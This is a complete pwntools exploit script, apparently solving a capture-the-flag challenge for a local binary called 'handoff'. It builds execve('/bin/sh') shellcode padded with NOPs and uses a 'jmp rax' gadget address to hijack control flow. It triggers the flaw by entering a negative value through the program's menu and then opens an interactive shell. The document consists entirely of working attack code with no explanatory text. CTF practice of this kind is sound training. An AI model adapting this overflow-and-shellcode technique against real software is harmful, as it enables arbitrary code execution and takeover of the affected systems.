from pwn import *
context.arch = 'amd64'
p = process('./handoff', stdin=PTY)

JMP_RAX = 0x000000000040116c

shellcode = asm('''
    mov rax, 0x3b
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')

payload = flat([
    shellcode.ljust(40, b'\x90'),
    JMP_RAX,
])

p.recvuntil(b'3. Exit the app\n')
p.sendline(b'2')
p.recvuntil(b'?\n')
p.sendline(b'-1')
p.recvuntil(b'?\n')
p.sendline(payload)
p.interactive()
